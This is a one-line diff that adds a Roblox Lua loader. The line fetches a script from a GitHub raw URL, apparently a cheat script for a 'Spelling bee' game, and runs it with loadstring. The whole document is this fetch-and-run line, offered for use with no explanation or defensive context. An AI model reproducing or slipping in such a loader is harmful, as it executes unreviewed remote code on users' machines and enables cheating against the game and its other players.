@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sketchy91/Scripts/refs/heads/main/Spelling%20bee%20Updated"))()
